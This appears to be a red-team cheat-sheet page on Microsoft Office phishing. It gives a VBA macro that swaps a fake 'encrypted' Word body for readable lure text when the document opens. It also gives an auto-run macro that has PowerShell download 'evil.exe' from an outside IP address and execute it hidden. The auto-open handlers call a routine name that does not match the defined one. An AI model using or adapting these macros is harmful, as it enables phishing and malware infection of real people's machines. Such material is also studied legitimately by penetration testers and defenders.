# MS Office




## MS Word Document with Switcheroo Text

1. Place "encrypted" data in a Word document after the pretext (random base64): `head -c 2K < /dev/urandom > rnd && base64 rnd`.
2. Create an AutoText: Insert → Quick Parts → AutoTexts → Save Selection as `DecryptedBody` to AutoText Gallery.
3. Create a macro to "decrypt" the body with readable content according to the phishing legend.

{% code title="DecryptPage.bas" %}
```vb
Sub Document_Open()
  DecryptPage
End Sub

Sub AutoOpen()
  DecryptPage
End Sub

Sub DecryptPage()
  ActiveDocument.Content.Select
  Selection.Delete
  ActiveDocument.AttachedTemplate.AutoTextEntries("DecryptedBody").Insert Where:=Selection.Range, RichText:=True
End Sub
```
{% endcode %}




## VBA Macros

Wait till a malicious binary is downloaded with PowerShell and execute it:

{% code title="DownloadWaitExec.bas" %}
```
Sub Document_Open()
  hShellcodeRunner
End Sub

Sub AutoOpen()
  hShellcodeRunner
End Sub

Sub DownloadWaitExec()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.13.37/evil.exe', 'evil.exe')"
  Shell str, vbHide
  Dim exePath As String
  exePath = ActiveDocument.Path + "\evil.exe"
  Wait (2)
  Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
  Dim t As Date
  t = Now
  Do
    DoEvents
  Loop Until Now >= DateAdd("s", n, t)
End Sub
```
{% endcode %}
